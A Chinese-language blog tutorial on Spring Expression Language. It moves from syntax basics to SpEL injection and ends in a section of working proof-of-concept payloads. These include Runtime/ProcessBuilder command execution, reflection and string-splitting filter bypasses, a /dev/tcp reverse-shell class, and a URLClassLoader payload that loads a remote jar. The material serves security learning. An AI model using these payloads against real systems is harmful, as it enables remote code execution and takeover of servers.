# EL表达式注入

  
  
&lt;!--more--&gt;  
# Java SpEL表达式注入  
## 0x01 SpEL表达式基础  
### SpEL简介  
在Spring3中引入了Spring表达式语言(Spring Expression Language，简称 SpEL)，这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于XML和基于注解的Spring配置还有bean定义一起使用。  
在Spring系列产品中，SpEL是表达式计算的基础，实现了与Spring生态系统所有产品无缝对接。Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系。而SpEL可以方便快捷的对`ApplicationContext`中的Bean进行属性的装配和提取。由于它能够在运行时动态分配值，因为可以为我们节省大量Java代码。  
SpEL有许多特性  
使用Bean的ID来引用Bean  
可调用方法和访问对象的属性  
可对值进行算数、关系和逻辑运算  
可使用正则表达式进行匹配  
可进行集合操作  
### SpEL定界符---`#{}`  
SpEL使用`#{}`作为定界符，所有在大括号中的字符都将被认为是SpEL表达式，在其中可以使用`SpEL`运算符，变量、引用`Bean`及其属性和方法等。  
这里需要注意`#{}`和`${}`的区别：  
`#{}`就是SpEL的定界符，用于指明内容未`SpEL`表达式并执行；  
`${}`主要用于加载外部属性文件中的值  
两者可以混合使用，但是必须`#{}`在外面，`${}`在里面，如`#{&#39;${}&#39;}`，注意单引号是字符串类型才添加的。  
### SpEL表达式类型  
#### 字面值  
最简单的SpEL表达式就是仅包含一个字面值  
下面在XML配置文件中使用SpEL设置类属性的值为字面值，此时需要用到`#{}`定界符，注意若是制定字符串的话需要添加单引号括起来  
```xml  
&lt;property name=&#34;message1&#34; value=&#34;#{666}&#34;/&gt;  
&lt;property name=&#34;message2&#34; value=&#34;#{&#39;John&#39;}&#34;/&gt;  
```  
还可以直接与字符串混用  
```xml  
&lt;property name=&#34;message&#34; value=&#34;the value is #{666}&#34;/&gt;  
```  
Java基本数据类型都可以出现在SpEL表达式中，表达式中的数字也可以使用科学计数法  
```xml  
&lt;property name=&#34;salary&#34; value=&#34;#{1e4}&#34;/&gt;  
```  
### Demo  
HelloWorld.java  
```java  
package org.example.springspel;    
    
public class HelloWorld {    
    private String message;    
    
    public void setMessage(String message){    
        this.message  = message;    
    }    
    
    public void getMessage(){    
        System.out.println(&#34;Your Message : &#34; &#43; message);    
    }    
}  
```  
Demo.xml  
```xml  
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;    
&lt;beans xmlns=&#34;http://www.springframework.org/schema/beans&#34;    
       xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;    
       xsi:schemaLocation=&#34;http://www.springframework.org/schema/beans    
 http://www.springframework.org/schema/beans/spring-beans-3.0.xsd &#34;&gt;    
    
    &lt;bean id=&#34;helloWorld&#34; class=&#34;org.example.springspel.HelloWorld&#34;&gt;    
        &lt;property name=&#34;message&#34; value=&#34;#{&#39;Hello World&#39;} is #{666}&#34; /&gt;    
    &lt;/bean&gt;    
&lt;/beans&gt;  
```  
MainTestDemo.java  
```java  
package org.example.springspel;    
import org.springframework.context.ApplicationContext;    
import org.springframework.context.support.ClassPathXmlApplicationContext;    
    
public class MainTestDemo {    
        public static void main(String[] args) throws Exception{    
            ApplicationContext context = new ClassPathXmlApplicationContext(&#34;Demo.xml&#34;);    
            HelloWorld helloWorld = context.getBean(&#34;helloWorld&#34;, HelloWorld.class);    
            helloWorld.getMessage();    
        }    
    }  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409091526375.png)
### 引用Bean、属性和方法  
#### 引用Bean  
SpEL表达式能够通过其他Bean的ID进行引用，直接在`#{}`符号中写入ID名即可，无需添加单引号括起来  
```xml  
&lt;constructor-arg value=&#34;#{test}&#34;/&gt;  
```  
#### 引用类属性  
SpEL表达式能够访问类的属性  
比如，Tom参赛者是一位模仿高手，Jim唱什么歌，弹奏什么乐器，他就唱什么歌，弹奏什么乐器  
```xml  
&lt;bean id=&#34;Jim&#34; class=&#34;com.spring.entity.Instrumentalist&#34;  
    p:song=&#34;May Rain&#34;  
    p:instrument-ref=&#34;piano&#34;/&gt;  
&lt;bean id=&#34;Tom&#34; class=&#34;com.spring.entity.Instrumentalist&#34;&gt;  
    &lt;property name=&#34;instrument&#34; value=&#34;#{Jim.instrument}&#34;/&gt;  
    &lt;property name=&#34;song&#34; value=&#34;#{Jim.song}&#34;/&gt;  
&lt;/bean&gt;  
```  
key指定`Jim&lt;bean&gt;`的id  
value指定`Jim&lt;bean&gt;`的song属性。其等价于执行下面的代码  
```java  
Instrumentalist carl = new Instrumentalist();  
carl.setSong(Jim.getSong());  
```  
#### 引用类方法  
SpEL表达式还可以访问类的方法  
假设现在有个`SongSelector`类，该类有个`selectSong()`方法，这样的话`Tom`就可以不用模仿别人，开始唱`selectSelector`所选的歌了  
```xml  
&lt;property name=&#34;song&#34; value=&#34;#{SongSelector.selectSong()}&#34;/&gt;  
```  
carl 有个癖好，歌曲名不是大写的他就浑身难受，我们现在要做的就是仅仅对返回的歌曲调用 `toUpperCase()` 方法：  
```xml  
&lt;property name=&#34;song&#34; value=&#34;#{SongSelector.selectSong().toUpperCase()}&#34;/&gt;  
```  
注意：这里我们不能确保不抛出`NullPointerException`，为了避免这个问题，我们可以使用`SpEL`的`null-safe`存取器  
```xml  
&lt;property name=&#34;song&#34; value=&#34;#{SongSelector.selectSong()?.toUpperCase()}&#34;/&gt;  
```  
`?.`符号会确保左边的表达式不为`null`，如果为`null`的话就不会调用`toUpperCase()`方法了。  
#### Demo-引用Bean  
这里我们修改基于构造函数的依赖注入的示例  
`SpellChecker.java`  
```java  
package org.example.springspel.pojo;    
    
public class SpellChecker {    
    public SpellChecker(){    
        System.out.println(&#34;Inside SpellChecker constructor.&#34; );    
    }    
    public void checkSpelling() {    
        System.out.println(&#34;Inside checkSpelling.&#34; );    
    }    
}  
```  
`TextEditor.java`  
```java  
package org.example.springspel.pojo;    
    
public class TextEditor {    
    private SpellChecker spellChecker;    
    public TextEditor(SpellChecker spellChecker) {    
        System.out.println(&#34;Inside TextEditor constructor.&#34; );    
        this.spellChecker = spellChecker;    
    }    
    public void spellCheck() {    
        spellChecker.checkSpelling();    
    }    
}  
```  
编写`editor.xml`  
```xml  
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;    
&lt;beans xmlns=&#34;http://www.springframework.org/schema/beans&#34;    
       xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;    
       xsi:schemaLocation=&#34;http://www.springframework.org/schema/beans    
 http://www.springframework.org/schema/beans/spring-beans-3.0.xsd &#34;&gt;    
    
    &lt;bean id=&#34;spellChecker&#34; class=&#34;org.example.springspel.pojo.SpellChecker&#34; /&gt;    
    
    &lt;bean id=&#34;textEditor&#34; class=&#34;org.example.springspel.pojo.TextEditor&#34;&gt;    
        &lt;constructor-arg value=&#34;#{spellChecker}&#34;/&gt;    
    &lt;/bean&gt;&lt;/beans&gt;  
```  
启动类`RefSpellAndEditor.java`  
```java  
package org.example.springspel.starer;    
    
import org.example.springspel.pojo.TextEditor;    
import org.springframework.context.ApplicationContext;    
import org.springframework.context.support.ClassPathXmlApplicationContext;    
    
public class RefSpellAndEditor {    
    public static void main(String[] args) {    
        ApplicationContext context = new ClassPathXmlApplicationContext(&#34;editor.xml&#34;);    
        TextEditor te = (TextEditor) context.getBean(&#34;textEditor&#34;);    
        te.spellCheck();    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409101440057.png)
### 类类型表达式T(Type)  
在`SpEL`表达式中，使用`T(Type)`运算符会调用类的作用域和方法。换句话说，就是可以通过该类类型表达式来操作类。  
使用`T(Type)`来表示`java.lang.Class`实例。Type必须是类全限定名，但`java.lang`包除外，因为`SpEL`已经内置了该包，即该包下的类可以不指定具体的包名；使用类类型表达式还可以进行访问类静态方法和类静态字段。  
	`Java.lang.Runtime`这个包是包含于`java.lang`的包的，所以如果能调用`Runtime`就可以进行命令执行  
在XML配置文件中的使用示例，要调用`java.lang.Math`来获取`0~1`的随机数  
```xml  
&lt;property name=&#34;random&#34; value=&#34;#{T(java.lang.Math).random()}&#34;/&gt;  
```  
`Expression`中使用示例  
```java  
ExpressionParser parser = new SpelExpressionParser();  
// java.lang 包类访问  
Class&lt;String&gt; result1 = parser.parseExpression(&#34;T(String)&#34;).getValue(Class.class);  
System.out.println(result1);  
//其他包类访问  
String expression2 = &#34;T(java.lang.Runtime).getRuntime().exec(&#39;open /Applications/Calculator.app&#39;)&#34;;  
Class&lt;Object&gt; result2 = parser.parseExpression(expression2).getValue(Class.class);  
System.out.println(result2);  
//类静态字段访问  
int result3 = parser.parseExpression(&#34;T(Integer).MAX_VALUE&#34;).getValue(int.class);  
System.out.println(result3);  
//类静态方法调用  
int result4 = parser.parseExpression(&#34;T(Integer).parseInt(&#39;1&#39;)&#34;).getValue(int.class);  
System.out.println(result4);  
```  
#### Demo  
在前面字面值的`Demo`中修改`Demo.xml`即可  
```xml  
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;    
&lt;beans xmlns=&#34;http://www.springframework.org/schema/beans&#34;    
       xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;    
       xsi:schemaLocation=&#34;http://www.springframework.org/schema/beans    
 http://www.springframework.org/schema/beans/spring-beans-3.0.xsd &#34;&gt;    
    
    &lt;bean id=&#34;helloWorld&#34; class=&#34;org.example.springspel.pojo.HelloWorld&#34;&gt;    
        &lt;property name=&#34;message&#34; value=&#34;#{&#39;Hello World&#39;} is #{T(java.lang.Math).random()}&#34; /&gt;    
    &lt;/bean&gt;&lt;/beans&gt;  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409101454946.png)
#### 恶意利用---弹计算器  
修改value中的类类型表达式的类为`Runtime`并调用其命令执行方法即可  
```xml  
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;    
&lt;beans xmlns=&#34;http://www.springframework.org/schema/beans&#34;    
       xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;    
       xsi:schemaLocation=&#34;http://www.springframework.org/schema/beans    
 http://www.springframework.org/schema/beans/spring-beans-3.0.xsd &#34;&gt;    
    
    &lt;bean id=&#34;helloWorld&#34; class=&#34;org.example.springspel.pojo.HelloWorld&#34;&gt;    
        &lt;property name=&#34;message&#34; value=&#34;#{&#39;Hello World&#39;} is #{T(java.lang.Runtime).getRuntime().exec(&#39;open -a Calculator&#39;)}&#34; /&gt;    
    &lt;/bean&gt;&lt;/beans&gt;  
```  
## 0x02 SpEL用法  
SpEL的用法有三种形式，一种是在注解`@Value`中；一种是XML配置；最后一种是在代码块中使用`Expression`  
前面的就是以XML配置为例对`SpEL`表达式的用法进行的说明，而注解`@Value`的用法例子如下  
```java  
public class EmailSender {  
    @Value(&#34;${spring.mail.username}&#34;)  
    private String mailUsername;  
    @Value(&#34;#{ systemProperties[&#39;user.region&#39;] }&#34;)      
    private String defaultLocale;  
    //...  
}  
```  
这种形式的值一般是写在`properties`的配置文件中的。下面具体看`Expression`的，`Expression`的用法很重要  
### Expression用法  
由于后续分析的各种 Spring CVE 漏洞都是基于 Expression 形式的 SpEL 表达式注入，因此这里再单独说明 SpEL 表达式 Expression 这种形式的用法。  
#### 步骤  
SpEL在求表达式值一般分为四步，其中第三步可选：首先构造一个解析器，其次解析器解析字符串表达式，在此构造上下文，最后根据上下文得到表达式运算后的值  
```java  
ExpressionParser parser = new SpelExpressionParser();  
Expression expression = parser.parseExpression(&#34;(&#39;Hello&#39; &#43; &#39; huahua&#39;).concat(#end)&#34;);  
EvaluationContext context = new StandardEvaluationContext();  
context.setVariable(&#34;end&#34;, &#34;!&#34;);  
System.out.println(expression.getValue(context));  
```  
具体步骤如下  
1、创建解析器：SpEL使用`ExpressionParser`接口表示解析器，提供`SpelExpressionParser`默认实现。  
2、解析表达式：使用`ExpressionParser`的`parseExpression`来解析相应的表达式为`Expression`对象  
3、构造上下文：准备比如变量定义等等表达式需要的上下文数据；  
4、求值：通过`Expression`接口的`getValue`方法根据上下文获取表达式值  
##### 主要接口  
- ExpressionParser接口：表示解析器，默认实现是`org.springframework.expression.spel.standard`包中的`SpelExpressionParser`类，使用`parseExpression`方法将字符串表达式转换为`Expression`对象，对于`ParserContext`接口用于定义字符串表达式是不是模版，及模版开始与结束字符  
- `EvaluationContext`接口：表示上下文环境，默认是`org.springframework.expression.spel.support`包中的`StandardEvaluationContext`，使用`setRootObject`方法来设置根对象，使用`setVariable`方法来注册自定义变量，使用`registerFunction`来注册自定义函数等。  
- Expression接口：表示表达式对象，默认实现是`org.springframework.expression.spel.standard`包中的`SpelExpression`，提供`getValue`方法用于获取表达式值，提供`setValue`方法用于设置对象值  
##### Demo  
应用示例如下，和前面XML配置的用法区别于程序会将这里传入`parseExpression()`函数的字符串参数当成`SpEL`表达式来解析，而无需通过`#{}`符号来注明  
```java  
package org.example.springspel.starer;    
    
import org.springframework.expression.Expression;    
import org.springframework.expression.ExpressionParser;    
import org.springframework.expression.spel.standard.SpelExpressionParser;    
    
public class ExpressionCalc {    
    public static void main(String[] args) {    
        String spel = &#34;T(java.lang.Runtime).getRuntime().exec(&#39;open -a Calculator&#39;)&#34;;    
        ExpressionParser parser = new SpelExpressionParser();    
        Expression expression = parser.parseExpression(spel);    
        System.out.println(expression.getValue());    
    
    }    
}  
```  
##### 类实例化  
类实例化同样使用Java关键字new，类名必须是全限定名，但`java.lang`包内的类型除外  
```java  
package org.example.springspel.starer;    
    
import org.springframework.expression.Expression;    
import org.springframework.expression.ExpressionParser;    
import org.springframework.expression.spel.standard.SpelExpressionParser;    
    
public class newClass {    
    public static void main(String[] args) {    
        String spel = &#34;new java.util.Date()&#34;;    
        ExpressionParser parser = new SpelExpressionParser();    
        Expression expression = parser.parseExpression(spel);    
        System.out.println(expression.getValue());    
    }    
}  
```  
#### SpEL表达式运算  
SpEL 提供了以下几种运算符  
  
|运算符类型|运算符|  
|---|---|  
|算数运算|&#43;, -, *, /, %, ^|  
|关系运算|&lt;, &gt;, ==, &lt;=, &gt;=, lt, gt, eq, le, ge|  
|逻辑运算|and, or, not, !|  
|条件运算|?:(ternary), ?:(Elvis)|  
|正则表达式|matches|  
##### 算数运算  
加法运算  
```xml  
&lt;property name=&#34;add&#34; value=&#34;#{counter.total&#43;42}&#34;/&gt;  
```  
加号还可以用于字符串拼接：  
```xml  
&lt;property name=&#34;blogName&#34; value=&#34;#{my blog name is&#43;&#39; &#39;&#43;mrBird }&#34;/&gt;  
```  
`^`运算符执行幂运算。  
##### 关系运算  
  
|运算符|符号|文本类型|  
|---|---|---|  
|等于|==|eq|  
|小于|&lt;|lt|  
|小于等于|&lt;=|le|  
|大于|&gt;|gt|  
|大于等于|&gt;=|ge|  
  
##### 逻辑运算  
`and or ! not`  
##### 条件运算  
条件运算符类似于 Java 的三目运算符：  
```xml  
&lt;property name=&#34;instrument&#34; value=&#34;#{songSelector.selectSong() == &#39;May Rain&#39; ? piano:saxphone}&#34;/&gt;  
```  
##### 正则表达式  
验证邮箱  
```xml  
&lt;property name=&#34;email&#34; value=&#34;#{admin.email matches &#39;[a-zA-Z0-9._%&#43;-]&#43;@[a-zA-Z0-9.-]&#43;\\.com&#39;}&#34;/&gt;  
```  
#### 集合操作  
SpEL表达式支持对集合进行操作，  
Demo  
City.java  
修改`city.xml`，使用`&lt;util:list&gt;`元素配置一个包含City对象的List集合  
```java  
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;    
&lt;beans xmlns=&#34;http://www.springframework.org/schema/beans&#34;    
       xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;    
       xmlns:p=&#34;http://www.springframework.org/schema/p&#34;    
       xmlns:util=&#34;http://www.springframework.org/schema/util&#34;    
       xsi:schemaLocation=&#34;http://www.springframework.org/schema/beans    
    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd    http://www.springframework.org/schema/util    http://www.springframework.org/schema/util/spring-util-4.0.xsd&#34;&gt;    
    &lt;util:list id=&#34;cities&#34;&gt;    
        &lt;bean class=&#34;org.example.springspel.pojo.City&#34; p:name=&#34;Chicago&#34; p:state=&#34;IL&#34; p:population=&#34;123456&#34; /&gt;    
        &lt;bean class=&#34;org.example.springspel.pojo.City&#34; p:name=&#34;Atlanta&#34; p:state=&#34;GA&#34; p:population=&#34;123456&#34; /&gt;    
    &lt;/util:list&gt;    
    &lt;/beans&gt;  
```  
##### 访问集合成员  
SpEL表达式通过支持`#{集合ID[i]}`的方式来访问集合中的成员。  
`ChoseCity.java`  
```java  
package org.example.springspel.pojo;    
    
public class ChoseCity {    
    private City city;    
    
    public City getCity() {    
        return city;    
    }    
    
    public void setCity(City city) {    
        this.city = city;    
    }    
}  
```  
在`city.xml`中选取集合中某一个成员，并赋值给city属性，这个语句在写在util的外面  
```xml  
&lt;bean id=&#34;choseCity&#34; class=&#34;org.example.springspel.pojo.ChoseCity&#34;&gt;    
    &lt;property name=&#34;city&#34; value=&#34;#{cities[0]}&#34;/&gt;    
&lt;/bean&gt;  
```  
CityDemo.java  
```java  
package org.example.springspel.starer;    
    
import org.example.springspel.pojo.ChoseCity;    
import org.springframework.context.ApplicationContext;    
import org.springframework.context.support.ClassPathXmlApplicationContext;    
    
public class CityDemo {    
    public static void main(String[] args) {    
        ApplicationContext applicationContext = new ClassPathXmlApplicationContext(&#34;city.xml&#34;);    
        ChoseCity c = (ChoseCity) applicationContext.getBean(&#34;choseCity&#34;);    
        System.out.println(c.getCity().getName());    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409111453907.png)
## 0x03 SpEL表达式漏洞注入  
### 漏洞原理  
`SimpleEvalulationContext`和`StandardEvalulationContext`是SpEL提供的两个`EvalulationContext`：  
- SimpleEvaluationContext：针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集  
- StandardEvalulationContext：公开全套SpEL语言功能和配置选项。可以使用它来指定默认的根对象并配置每个可用的评估相关策略  
`SimpleEvluationContext`旨在仅支持SpEL语言语法的一个子集，不包括Java类型引用、构造函数和bean引用；而`StandardEvaluationContext`是支持全部SpEL语法的。  
由前面知道，SpEL表达式是可以操作类及其方法的，可以通过类类型表达式`T(Type)`来调用任意类方法。这是因为在不指定`EvaluationContext`的情况下默认采用的是`StandardEvaluationContext`，而它包含了`SpEL`的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。  
如下  
```java  
public class BasicCalc {    
    public static void main(String[] args) {    
        String spel = &#34;T(java.lang.Runtime).getRuntime().exec(\&#34;open -a Calculator\&#34;)&#34;;    
        ExpressionParser parser = new SpelExpressionParser();    
        Expression expression = parser.parseExpression(spel);    
        System.out.println(expression.getValue());    
    }    
}  
```  
### 通过反射的方式进行SpEL注入  
漏洞原理是调用任意类，所以可以通过反射的形式  
```java  
package org.example.springspel.starer;    
    
import org.springframework.expression.Expression;    
import org.springframework.expression.ExpressionParser;    
import org.springframework.expression.spel.standard.SpelExpressionParser;    
    
public class ReflectBypass {    
    public static void main(String[] args) {    
        String spel=&#34;T(String).getClass().forName(\&#34;java.lang.Runtime\&#34;).getRuntime().exec(\&#34;open -a Calculator\&#34;)&#34;;    
        ExpressionParser parser = new SpelExpressionParser();    
        Expression expression = parser.parseExpression(spel);    
        System.out.println(expression.getValue());    
    }    
}  
```  
### 基础POC&amp;Bypass整理  
各种POC  
```java  
// PoC原型  
   
// Runtime  
T(java.lang.Runtime).getRuntime().exec(&#34;calc&#34;)  
T(Runtime).getRuntime().exec(&#34;calc&#34;)  
   
// ProcessBuilder  
new java.lang.ProcessBuilder({&#39;calc&#39;}).start()  
new ProcessBuilder({&#39;calc&#39;}).start()  
```  
用ProcessBuilder来进行命令执行的代码如下  
```java  
public class ProcessBuilderBypass {    
    public static void main(String[] args) {    
        String spel = &#34;new java.lang.ProcessBuilder(new String[]{\&#34;calc\&#34;}).start()&#34;;    
        ExpressionParser parser = new SpelExpressionParser();    
        Expression expression = parser.parseExpression(spel);    
        System.out.println(expression.getValue());    
    }    
}  
```  
#### 基础Bypass  
```java  
// Bypass技巧  
   
// 反射调用  
T(String).getClass().forName(&#34;java.lang.Runtime&#34;).getRuntime().exec(&#34;calc&#34;)  
   
// 同上，需要有上下文环境  
#this.getClass().forName(&#34;java.lang.Runtime&#34;).getRuntime().exec(&#34;calc&#34;)  
   
// 反射调用&#43;字符串拼接，绕过如javacon题目中的正则过滤  
T(String).getClass().forName(&#34;java.l&#34;&#43;&#34;ang.Ru&#34;&#43;&#34;ntime&#34;).getMethod(&#34;ex&#34;&#43;&#34;ec&#34;,T(String[])).invoke(T(String).getClass().forName(&#34;java.l&#34;&#43;&#34;ang.Ru&#34;&#43;&#34;ntime&#34;).getMethod(&#34;getRu&#34;&#43;&#34;ntime&#34;).invoke(T(String).getClass().forName(&#34;java.l&#34;&#43;&#34;ang.Ru&#34;&#43;&#34;ntime&#34;)),new String[]{&#34;cmd&#34;,&#34;/C&#34;,&#34;calc&#34;})  
   
// 同上，需要有上下文环境  
#this.getClass().forName(&#34;java.l&#34;&#43;&#34;ang.Ru&#34;&#43;&#34;ntime&#34;).getMethod(&#34;ex&#34;&#43;&#34;ec&#34;,T(String[])).invoke(T(String).getClass().forName(&#34;java.l&#34;&#43;&#34;ang.Ru&#34;&#43;&#34;ntime&#34;).getMethod(&#34;getRu&#34;&#43;&#34;ntime&#34;).invoke(T(String).getClass().forName(&#34;java.l&#34;&#43;&#34;ang.Ru&#34;&#43;&#34;ntime&#34;)),new String[]{&#34;cmd&#34;,&#34;/C&#34;,&#34;calc&#34;})  
   
// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1  
// byte数组内容的生成后面有脚本  
new java.lang.ProcessBuilder(new java.lang.String(new byte[]{99,97,108,99})).start()  
   
// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2  
// byte数组内容的生成后面有脚本  
T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)))  
```  
### 通过ClassLoader类加载器构造PoC&amp;Bypass  
#### URLClassLoader结合SpEL表达式注入  
先构造一份`Exp.jar`，放到远程vps即可，  
反弹shell  
```java  
public class Exp{  
    public Exp(String address){  
        address = address.replace(&#34;:&#34;,&#34;/&#34;);  
        ProcessBuilder p = new ProcessBuilder(&#34;/bin/bash&#34;,&#34;-c&#34;,&#34;exec 5&lt;&gt;/dev/tcp/&#34;&#43;address&#43;&#34;;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#34;);  
        try {  
            p.start();  
        } catch (IOException e) {  
            e.printStackTrace();  
        }  
    }  
}  
```  
Payload  
必须使用全限定类名  
```java  
new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(&#34;http://127.0.0.1:8999/Exp.jar&#34;)}).loadClass(&#34;Exp&#34;).getConstructors()[0].newInstance(&#34;127.0.0.1:2333&#34;)  
```  
#### AppClassLoader  
加载Runtime执行  
由于需要调用到静态方法所以还是需要用到`T()`操作  
```java  
T(ClassLoader).getSystemClassLoader().loadClass(&#34;java.lang.Runtime&#34;).getRuntime().exec(&#34;open /System/Applications/Calculator.app&#34;)  
```  
记载ProcessBuilder执行  
```java  
T(ClassLoader).getSystemClassLoader().loadClass(&#34;java.lang.ProcessBuilder&#34;).getConstructors()[1].newInstance(new String[]{&#34;open&#34;,&#34;/System/Applications/Calculator.app&#34;}).start()  
```  
#### 通过其他类获取AppClassLoader  
使用SpEL的话一定存在`org.springframework`的包，这个包下有许许多多的类，而这些类的`classloader`就是`AppClassLoader`  
比如 `org.springframework.expression.Expression` 类  
`System.out.println( org.springframework.expression.Expression.class.getClassLoader());`  
获取AppClassLoader的方法`T(org.springframework.expression.Expression).getClass().getClassLoader()`  
假设使用 thyemleaf 的话会有`org.thymeleaf.context.AbstractEngineContext`  
`T(org.thymeleaf.context.AbstractEngineContext).getClass().getClassLoader()`  
假设有一个自定义的  
`T(com.ctf.controller.Demo).getClass().getClassLoader()`  
#### 通过内置对象加载`URLClassLoader`  
```java  
{request.getClass().getClassLoader().loadClass(\&#34;java.lang.Runtime\&#34;).getMethod(\&#34;getRuntime\&#34;).invoke(null).exec(\&#34;touch/tmp/foobar\&#34;)}  
  
username[#this.getClass().forName(&#34;javax.script.ScriptEngineManager&#34;).newInstance().getEngineByName(&#34;js&#34;).eval(&#34;java.lang.Runtime.getRuntime().exec(&#39;xterm&#39;)&#34;)]=asdf  
```  
request、response 对象是 Web 项目的常客,通过第一个 poc 测试发现在 Web 项目如果引入了 SpEL 的依赖，那么这两个对象会自动被注册进去。  
  

---

> Author: N1Rvana  
> URL: http://localhost:1313/el%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/  

